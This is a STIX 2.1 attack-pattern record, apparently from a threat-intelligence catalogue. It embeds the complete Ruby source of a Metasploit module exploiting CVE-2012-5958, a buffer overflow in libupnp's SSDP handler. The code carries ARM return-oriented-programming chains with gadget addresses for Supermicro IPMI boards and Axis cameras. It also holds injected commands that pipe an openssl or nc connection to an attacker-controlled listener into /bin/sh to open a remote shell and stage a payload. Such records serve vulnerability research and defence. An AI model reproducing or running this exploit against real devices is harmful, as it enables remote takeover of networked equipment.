{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9683872b-1905-425e-a4f7-00383c7c2a4b",
    "created": "2024-08-14T17:07:03.772629Z",
    "modified": "2024-08-14T17:07:03.772634Z",
    "name": "Portable UPnP SDK unique_service_name() Remote Code Execution",
    "description": " This module exploits a buffer overflow in the unique_service_name() function of libupnp's SSDP processor. The libupnp library is used across thousands of devices and is referred to as the Intel SDK for UPnP Devices or the Portable SDK for UPnP Devices.  Due to size limitations on many devices, this exploit uses a separate TCP listener to stage the real payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/upnp/libupnp_ssdp_overflow.rb",
            "external_id": "libupnp_ssdp_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5958"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Portable UPnP SDK unique_service_name() Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the unique_service_name()\n        function of libupnp's SSDP processor. The libupnp library is used across\n        thousands of devices and is referred to as the Intel SDK for UPnP\n        Devices or the Portable SDK for UPnP Devices.\n\n        Due to size limitations on many devices, this exploit uses a separate TCP\n        listener to stage the real payload.\n      },\n      'Author'         => [\n          'hdm',                                              # Exploit dev for Supermicro IPMI\n          'Alex Eubanks <endeavor[at]rainbowsandpwnies.com>', # Exploit dev for Supermicro IPMI\n          'Richard Harman <richard[at]richardharman.com>',    # Binaries, system info, testing for Supermicro IPMI\n          'Frederic Basse <contact[at]fredericb.info>'        # Exploit dev for Axis Camera M1011\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-5958' ],\n          [ 'OSVDB', '89611' ],\n          [ 'US-CERT-VU', '922681' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play' ]\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true,\n      'DefaultOptions' => { 'WfsDelay' => 10 },\n      'Payload'        =>\n        {\n#\n#\t\t\t\t\t# The following BadChars do not apply since we stage the payload\n#\t\t\t\t\t# through a secondary connection. This is just for reference.\n#\n#\t\t\t\t\t'BadChars'  =>\n#\t\t\t\t\t\t# Bytes 0-8 are not allowed\n#\t\t\t\t\t\t[*(0..8)].pack(\"C*\") +\n#\t\t\t\t\t\t# 0x09, 0x0a, 0x0d are allowed\n#\t\t\t\t\t\t\"\\x0b\\x0c\\x0e\\x0f\" +\n#\t\t\t\t\t\t# All remaining bytes up to space are restricted\n#\t\t\t\t\t\t[*(0x10..0x1f)].pack(\"C*\") +\n#\t\t\t\t\t\t# Also not allowed\n#\t\t\t\t\t\t\"\\x7f\\x3a\" +\n#\t\t\t\t\t\t# Breaks our string quoting\n#\t\t\t\t\t\t\"\\x22\",\n\n          # Unlimited since we stage this over a secondary connection\n          'Space'       => 8000,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              # specific payloads vary widely by device (openssl for IPMI, etc)\n            }\n        },\n      'Targets'        =>\n        [\n\n          [ \"Automatic\", { } ],\n\n          #\n          # ROP targets are difficult to represent in the hash, use callbacks instead\n          #\n          [ \"Supermicro Onboard IPMI (X9SCL/X9SCM) Intel SDK 1.3.1\", {\n\n            # The callback handles all target-specific settings\n            :callback => :target_supermicro_ipmi_131,\n\n            # This matches any line of the SSDP M-SEARCH response\n            :fingerprint =>\n              /Server:\\s*Linux\\/2\\.6\\.17\\.WB_WPCM450\\.1\\.3,? UPnP\\/1\\.0, Intel SDK for UPnP devices\\/1\\.3\\.1/mi\n            #\n            # SSDP response:\n            #\tLinux/2.6.17.WB_WPCM450.1.3 UPnP/1.0, Intel SDK for UPnP devices/1.3.1\n            #\thttp://192.168.xx.xx:49152/IPMIdevicedesc.xml\n            #\tuuid:Upnp-IPMI-1_0-1234567890001::upnp:rootdevice\n\n            # Approximately 35,000 of these found in the wild via critical.io scans (2013-02-03)\n\n          } ],\n          [ \"Axis Camera M1011 5.20.1 UPnP/1.4.1\", {\n\n            # The callback handles all target-specific settings\n            :callback => :target_axis_m1011_141,\n\n            # This fingerprint may not be specific enough to be used automatically.\n            #:fingerprint =>\n            #\t/SERVER:\\s*Linux\\/2\\.6\\.31, UPnP\\/1\\.0, Portable SDK for UPnP devices\\/1\\.4\\.1/mi\n            #\n            # SSDP response:\n            #\tLinux/2.6.31, UPnP/1.0, Portable SDK for UPnP devices/1.4.1\n            #\thttp://192.168.xx.xx:49152/rootdesc1.xml\n            #\tuuuid:Upnp-BasicDevice-1_0-00123456789A::upnp:rootdevice\n\n          } ],\n\n          [ \"Debug Target\", {\n\n            # The callback handles all target-specific settings\n            :callback => :target_debug\n\n          } ]\n\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-01-29'))\n\n    register_options(\n      [\n        Opt::RHOST(),\n        Opt::RPORT(1900),\n        OptAddress.new('CBHOST', [ false, \"The listener address used for staging the real payload\" ]),\n        OptPort.new('CBPORT', [ false, \"The listener port used for staging the real payload\" ])\n      ])\n  end\n\n\n  def exploit\n\n    configure_socket\n\n    target_info = choose_target\n\n    unless self.respond_to?(target_info[:callback])\n      print_error(\"Invalid target specified: no callback function defined\")\n      return\n    end\n\n    buffer = self.send(target_info[:callback])\n    pkt =\n      \"M-SEARCH * HTTP/1.1\\r\\n\" +\n      \"Host:239.255.255.250:1900\\r\\n\" +\n      \"ST:uuid:schemas:device:\" + buffer + \":end\\r\\n\" +\n      \"Man:\\\"ssdp:discover\\\"\\r\\n\" +\n      \"MX:3\\r\\n\\r\\n\"\n\n    print_status(\"Exploiting #{rhost} with target '#{target_info.name}' with #{pkt.length} bytes to port #{rport}...\")\n\n    udp_sock.sendto(pkt, rhost, rport, 0)\n\n    1.upto(5) do\n      ::IO.select(nil, nil, nil, 1)\n      break if session_created?\n    end\n\n    # No handler() support right now\n  end\n\n\n\n  # These devices are armle, run version 1.3.1 of libupnp, have random stacks, but no PIE on libc\n  def target_supermicro_ipmi_131\n\n    # Create a fixed-size buffer for the payload\n    buffer = Rex::Text.rand_text_alpha(2000)\n\n    # Place the entire buffer inside of double-quotes to take advantage of is_qdtext_char()\n    buffer[0,1]     = '\"'\n    buffer[1999,1]  = '\"'\n\n    # Prefer CBHOST, but use LHOST, or autodetect the IP otherwise\n    cbhost = datastore['CBHOST'] || datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST'])\n\n    # Start a listener\n    start_listener(true)\n\n    # Figure out the port we picked\n    cbport = self.service.getsockname[2]\n\n    # Restart the service and use openssl to stage the real payload\n    # Staged because only ~150 bytes of contiguous data are available before mangling\n    cmd = \"sleep 1;/bin/upnp_dev & echo; openssl s_client -quiet -host #{cbhost} -port #{cbport}|/bin/sh;exit;#\"\n    buffer[432, cmd.length] = cmd\n\n    # Adjust $r3 to point from the bottom of the stack back into our buffer\n    buffer[304,4] = [0x4009daf8].pack(\"V\") #\n      # 0x4009daf8:\tadd\tr3, r3, r4, lsl #2\n      # 0x4009dafc:\tldr\tr0, [r3, #512]\t; 0x200\n      # 0x4009db00:\tpop\t{r4, r10, pc}\n\n    # The offset (right-shifted by 2 ) to our command string above\n    buffer[284,4] = [0xfffffe78].pack(\"V\") #\n\n    # Copy $r3 into $r0\n    buffer[316,4] = [0x400db0ac].pack(\"V\")\n      # 0x400db0ac <_IO_wfile_underflow+1184>:\tsub\tr0, r3, #1\n      # 0x400db0b0 <_IO_wfile_underflow+1188>:\tpop\t{pc}\t\t; (ldr pc, [sp], #4)\n\n    # Move our stack pointer down so as not to corrupt our payload\n    buffer[320,4] = [0x400a5568].pack(\"V\")\n      # 0x400a5568 <__default_rt_sa_restorer_v2+5448>:\tadd\tsp, sp, #408\t; 0x198\n      # 0x400a556c <__default_rt_sa_restorer_v2+5452>:\tpop\t{r4, r5, pc}\n\n    # Finally return to system() with $r0 pointing to our string\n    buffer[141,4] = [0x400add8c].pack(\"V\")\n\n    return buffer\n=begin\n    00008000-00029000 r-xp 00000000 08:01 709233     /bin/upnp_dev\n    00031000-00032000 rwxp 00021000 08:01 709233     /bin/upnp_dev\n    00032000-00055000 rwxp 00000000 00:00 0          [heap]\n    40000000-40015000 r-xp 00000000 08:01 709562     /lib/ld-2.3.5.so\n    40015000-40017000 rwxp 00000000 00:00 0\n    4001c000-4001d000 r-xp 00014000 08:01 709562     /lib/ld-2.3.5.so\n    4001d000-4001e000 rwxp 00015000 08:01 709562     /lib/ld-2.3.5.so\n    4001e000-4002d000 r-xp 00000000 08:01 709535     /lib/libpthread-0.10.so\n    4002d000-40034000 ---p 0000f000 08:01 709535     /lib/libpthread-0.10.so\n    40034000-40035000 r-xp 0000e000 08:01 709535     /lib/libpthread-0.10.so\n    40035000-40036000 rwxp 0000f000 08:01 709535     /lib/libpthread-0.10.so\n    40036000-40078000 rwxp 00000000 00:00 0\n    40078000-40180000 r-xp 00000000 08:01 709620     /lib/libc-2.3.5.so\n    40180000-40182000 r-xp 00108000 08:01 709620     /lib/libc-2.3.5.so\n    40182000-40185000 rwxp 0010a000 08:01 709620     /lib/libc-2.3.5.so\n    40185000-40187000 rwxp 00000000 00:00 0\n    bd600000-bd601000 ---p 00000000 00:00 0\n    bd601000-bd800000 rwxp 00000000 00:00 0\n    bd800000-bd801000 ---p 00000000 00:00 0\n    bd801000-bda00000 rwxp 00000000 00:00 0\n    bdc00000-bdc01000 ---p 00000000 00:00 0\n    bdc01000-bde00000 rwxp 00000000 00:00 0\n    be000000-be001000 ---p 00000000 00:00 0\n    be001000-be200000 rwxp 00000000 00:00 0\n    be941000-be956000 rwxp 00000000 00:00 0          [stack]\n=end\n\n  end\n\n  # These devices are armv5tejl, run version 1.4.1 of libupnp, have random stacks, but no PIE on libc\n  def target_axis_m1011_141\n\n    # Create a fixed-size buffer for the payload\n    buffer = Rex::Text.rand_text_alpha(2000)\n\n    # Place the entire buffer inside of double-quotes to take advantage of is_qdtext_char()\n    buffer[0,1]     = '\"'\n    buffer[1999,1]  = '\"'\n\n    # Prefer CBHOST, but use LHOST, or autodetect the IP otherwise\n    cbhost = datastore['CBHOST'] || datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST'])\n\n    # Start a listener\n    start_listener()\n\n    # Figure out the port we picked\n    cbport = self.service.getsockname[2]\n\n    # Initiate a callback connection\n    cmd = \"sleep 1; /usr/bin/nc #{cbhost} #{cbport}|/bin/sh;exit;#\"\n    buffer[1, cmd.length] = cmd\n\n    # Mask to avoid forbidden bytes, popped into $r4\n    buffer[284,4] = [0x0D0D0D0D].pack(\"V\")\n\n    # Move $r4 to $r0\n    buffer[304,4] = [0x40093848].pack(\"V\")\n      #MEMORY:40093848 MOV     R0, R4\n      #MEMORY:4009384C LDMFD   SP!, {R4,PC}\n\n    # Masked system() address (0x32FB9D83 + 0x0D0D0D0D = 0x4008AA90), popped into $r4\n    buffer[308,4] = [0x32FB9D83].pack(\"V\")\n\n    # Set $r0 to system() address : $r0 = $r4 + $r0\n    buffer[312,4] = [0x40093844].pack(\"V\")\n      #MEMORY:40093844 ADD     R4, R4, R0\n      #MEMORY:40093848 MOV     R0, R4\n      #MEMORY:4009384C LDMFD   SP!, {R4,PC}\n\n    # Move $r0 to $r3 : system() address\n    buffer[320,4] = [0x400D65BC].pack(\"V\")\n      #MEMORY:400D65BC MOV     R3, R0\n      #MEMORY:400D65C0 MOV     R0, R3\n      #MEMORY:400D65C4 ADD     SP, SP, #0x10\n      #MEMORY:400D65C8 LDMFD   SP!, {R4,PC}\n\n    # Move $r2 to $r0 : offset to buffer[-1]\n    buffer[344,4] = [0x400ADCDC].pack(\"V\")\n      #MEMORY:400ADCDC MOV     R0, R2\n      #MEMORY:400ADCE0 ADD     SP, SP, #8\n      #MEMORY:400ADCE4 LDMFD   SP!, {R4-R8,PC}\n\n    # Negative offset to command str($r0 + 0xFFFFFEB2 = buffer[1]), popped into R4\n    buffer[356,4] = [0xFFFFFEB2].pack(\"V\")\n\n    # Set $r0 to command str offset : $r0 = $r4 + $r0\n    buffer[376,4] = [0x40093844].pack(\"V\")\n      #MEMORY:40093844 ADD     R4, R4, R0\n      #MEMORY:40093848 MOV     R0, R4\n      #MEMORY:4009384C LDMFD   SP!, {R4,PC}\n\n    # Jump to system() function\n    buffer[384,4] = [0x4009FEA4].pack(\"V\")\n      #MEMORY:4009FEA4 MOV     PC, R3\n\n    return buffer\n=begin\n    00008000-0002b000 r-xp 00000000 1f:03 62         /bin/libupnp\n    00032000-00033000 rwxp 00022000 1f:03 62         /bin/libupnp\n    00033000-00055000 rwxp 00000000 00:00 0          [heap]\n    40000000-4001d000 r-xp 00000000 1f:03 235        /lib/ld-2.9.so\n    4001d000-4001f000 rwxp 00000000 00:00 0\n    40024000-40025000 r-xp 0001c000 1f:03 235        /lib/ld-2.9.so\n    40025000-40026000 rwxp 0001d000 1f:03 235        /lib/ld-2.9.so\n    40026000-4002e000 r-xp 00000000 1f:03 262        /lib/libparhand.so\n    4002e000-40035000 ---p 00008000 1f:03 262        /lib/libparhand.so\n    40035000-40036000 rwxp 00007000 1f:03 262        /lib/libparhand.so\n    40036000-4004a000 r-xp 00000000 1f:03 263        /lib/libpthread-2.9.so\n    4004a000-40051000 ---p 00014000 1f:03 263        /lib/libpthread-2.9.so\n    40051000-40052000 r-xp 00013000 1f:03 263        /lib/libpthread-2.9.so\n    40052000-40053000 rwxp 00014000 1f:03 263        /lib/libpthread-2.9.so\n    40053000-40055000 rwxp 00000000 00:00 0\n    40055000-4016c000 r-xp 00000000 1f:03 239        /lib/libc-2.9.so\n    4016c000-40173000 ---p 00117000 1f:03 239        /lib/libc-2.9.so\n    40173000-40175000 r-xp 00116000 1f:03 239        /lib/libc-2.9.so\n    40175000-40176000 rwxp 00118000 1f:03 239        /lib/libc-2.9.so\n    40176000-40179000 rwxp 00000000 00:00 0\n    40179000-4017a000 ---p 00000000 00:00 0\n    4017a000-40979000 rwxp 00000000 00:00 0\n    40979000-4097a000 ---p 00000000 00:00 0\n    4097a000-41179000 rwxp 00000000 00:00 0\n    41179000-4117a000 ---p 00000000 00:00 0\n    4117a000-41979000 rwxp 00000000 00:00 0\n    41979000-4197a000 ---p 00000000 00:00 0\n    4197a000-42179000 rwxp 00000000 00:00 0\n    42179000-4217a000 ---p 00000000 00:00 0\n    4217a000-42979000 rwxp 00000000 00:00 0\n    42979000-4297a000 ---p 00000000 00:00 0\n    4297a000-43179000 rwxp 00000000 00:00 0\n    bef4d000-bef62000 rw-p 00000000 00:00 0          [stack]\n=end\n\n  end\n\n  # Generate a buffer that provides a starting point for exploit development\n  def target_debug\n    Rex::Text.pattern_create(2000)\n  end\n\n  def stage_real_payload(cli)\n    print_good(\"Sending payload of #{payload.encoded.length} bytes to #{cli.peerhost}:#{cli.peerport}...\")\n    cli.put(payload.encoded + \"\\n\")\n  end\n\n  def start_listener(ssl = false)\n\n    comm = datastore['ListenerComm']\n    if comm == \"local\"\n      comm = ::Rex::Socket::Comm::Local\n    else\n      comm = nil\n    end\n\n    self.service = Rex::Socket::TcpServer.create(\n      'LocalPort' => datastore['CBPORT'],\n      'SSL'       => ssl,\n      'SSLCert'   => datastore['SSLCert'],\n      'Comm'      => comm,\n      'Context'   =>\n        {\n          'Msf'        => framework,\n          'MsfExploit' => self,\n        })\n\n    self.service.on_client_connect_proc = Proc.new { |client|\n      stage_real_payload(client)\n    }\n\n    # Start the listening service\n    self.service.start\n  end\n\n  #\n  # Shut down any running services\n  #\n  def cleanup\n    super\n    if self.service\n      print_status(\"Shutting down payload stager listener...\")\n      begin\n        self.service.deref if self.service.kind_of?(Rex::Service)\n        if self.service.kind_of?(Rex::Socket)\n          self.service.close\n          self.service.stop\n        end\n        self.service = nil\n      rescue ::Exception\n      end\n    end\n  end\n\n  def choose_target\n    # If the user specified a target, use that one\n    return self.target unless self.target.name =~ /Automatic/\n\n    msearch =\n      \"M-SEARCH * HTTP/1.1\\r\\n\" +\n      \"Host:239.255.255.250:1900\\r\\n\" +\n      \"ST:upnp:rootdevice\\r\\n\" +\n      \"Man:\\\"ssdp:discover\\\"\\r\\n\" +\n      \"MX:3\\r\\n\\r\\n\"\n\n    # Fingerprint the service through SSDP\n    udp_sock.sendto(msearch, rhost, rport, 0)\n\n    res = nil\n    1.upto(5) do\n      res,_,_ = udp_sock.recvfrom(65535, 1.0)\n      break if res and res =~ /^(Server|Location)/mi\n      udp_sock.sendto(msearch, rhost, rport, 0)\n    end\n\n    self.targets.each do |t|\n      return t if t[:fingerprint] and res =~ t[:fingerprint]\n    end\n\n    if res and res.to_s.length > 0\n      print_status(\"No target matches this fingerprint\")\n      print_status(\"\")\n      res.to_s.split(\"\\n\").each do |line|\n        print_status(\"    #{line.strip}\")\n      end\n      print_status(\"\")\n    else\n      print_status(\"The system #{rhost} did not reply to our M-SEARCH probe\")\n    end\n\n    fail_with(Failure::NoTarget, \"No compatible target detected\")\n  end\n\n  # Accessor for our TCP payload stager\n  attr_accessor :service\n\n  # We need an unconnected socket because SSDP replies often come\n  # from a different sent port than the one we sent to. This also\n  # breaks the standard UDP mixin.\n  def configure_socket\n    self.udp_sock = Rex::Socket::Udp.create({\n      'Context'   => { 'Msf' => framework, 'MsfExploit' => self }\n    })\n    add_socket(self.udp_sock)\n  end\n\n  #\n  # Required since we aren't using the normal mixins\n  #\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  # Accessor for our UDP socket\n  attr_accessor :udp_sock\n\nend\n",
    "x_mitre_disclosure_date": "2013-01-29",
    "x_mitre_platforms": [
        "['unix']"
    ]
}